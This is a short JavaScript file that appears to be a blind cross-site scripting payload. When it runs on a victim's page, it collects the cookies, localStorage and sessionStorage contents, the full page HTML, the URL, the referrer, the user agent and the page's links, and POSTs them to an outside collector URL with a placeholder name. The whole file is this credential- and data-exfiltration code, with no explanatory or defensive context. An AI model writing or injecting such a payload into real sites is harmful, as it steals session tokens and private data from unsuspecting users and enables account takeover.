(function () {
  function send(data) {
    fetch("https://your-bxss-url.onrender.com/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  }

  const payloadData = {
    url: location.href,
    referer: document.referrer,
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.outerHTML,
    origin: location.origin,
    timestamp: new Date().toISOString(),
    payloadURL: "https://your-bxss-url.onrender.com/payload.js",
    extractedLinks: Array.from(document.querySelectorAll('a')).map(a => a.href),
    customFields: {
      pageTitle: document.title
    }
  };

  send(payloadData);
})();
